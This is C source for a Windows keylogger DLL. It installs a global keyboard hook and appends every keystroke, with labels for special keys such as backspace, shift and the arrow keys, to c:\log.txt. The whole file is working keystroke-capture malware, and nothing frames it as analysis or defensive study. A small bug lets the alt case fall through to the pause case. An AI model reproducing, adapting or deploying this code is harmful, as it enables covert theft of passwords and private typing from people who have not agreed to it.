#include <windows.h>
#include <stdio.h>
#include "jukes.h"

// window procedure
LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam);

HWND hMainWnd;
HHOOK hook;
int last=0;

int initDLL(HINSTANCE dllInst)
{
    if (!(hook = SetWindowsHookEx(WH_KEYBOARD, HookProc, dllInst, 0)))
		MessageBox(0, "Windows Hook Failed", "Alert", MB_OK | MB_SETFOREGROUND);
	return 0;
}

int quitDLL()
{
	MessageBox(NULL, "Quitting", "Quitting", MB_OK);
	if (hook)
		if (UnhookWindowsHookEx(hook)) MessageBox(0, "Hook Unhooked", "Alert", MB_OK);
	return 0;
}

LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	char temp[256] = "";
	

	if (nCode < 0) return CallNextHookEx(hook, nCode, wParam, lParam);
	
	if ((int)(lParam & MAKELPARAM(0, KF_ALTDOWN)) == 0)
	{
		FILE* out = fopen("c:\\log.txt", "a");
		if ((int)(lParam & MAKELPARAM(0,KF_UP)) != 0)
		{
			//sprintf(temp, "%d", (int)wParam);
			//MessageBox(0, temp, "Alert", MB_OK);
			switch ((int)wParam)
			{
			case 8:
				fprintf(out, " <bs> ");
				break;
			case 9:
				fprintf(out, " <tab> ");
				break;
			case 13:
				fprintf(out, "\n");
				break;
			case 16:
				fprintf(out, " </shift> ");
				break;
			case 17:
				fprintf(out, " <ctrl> ");
				break;
			case 18:
				fprintf(out, " <alt> ");
			case 19:
				fprintf(out, " <pause> ");
				break;
			case 20:
				fprintf(out, " <caps> ");
				break;
			case 27:
				fprintf(out, " <esc> ");
				break;
			case 33:
				fprintf(out, " <pgup> ");
				break;
			case 34:
				fprintf(out, " <pgdwn> ");
				break;
			case 35:
				fprintf(out, " <end> ");
				break;
			case 36:
				fprintf(out, " <home> ");
				break;
			case 37:
				fprintf(out, " <left> ");
				break;
			case 38:
				fprintf(out, " <up> ");
				break;
			case 39:
				fprintf(out, " <right> ");
				break;
			case 40:
				fprintf(out, " <down> ");
				break;
			case 45:
				fprintf(out, " <insert> ");
				break;
			case 46:
				fprintf(out, " <delete> ");
				break;
			default:
				fprintf(out, "%c", (char)wParam);
				break;
			}
			last = 0;
		}
		else if ((int)(lParam & MAKELPARAM(0,KF_UP)) == 0 && (int)wParam != last)
		{
			switch ((int)wParam)
			{
			case 16:
				fprintf(out, " <shift> ");
				break;
			}
			last = (int)wParam;
		}
		fclose(out);
	}
	
	return CallNextHookEx(hook, nCode, wParam, lParam);
}